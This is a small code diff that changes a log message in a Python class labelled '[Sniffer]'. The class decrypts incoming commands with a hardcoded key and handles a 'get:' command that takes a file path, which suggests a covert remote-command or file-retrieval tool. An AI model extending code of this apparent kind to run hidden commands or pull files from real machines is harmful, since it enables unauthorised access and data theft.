@@ -18,7 +18,7 @@ class Command:
     def execute(self):
         """ Executes the command based on the type of command. """
         decrypted = decrypt(self.cmd, "secret")
-        print("[Sniffer] Received command: " + decrypted)
+        print("[Sniffer] Executing command: " + decrypted)
         
         if decrypted.startswith("get:"):
             file_path = decrypted[decrypted.index(":") + 1:]
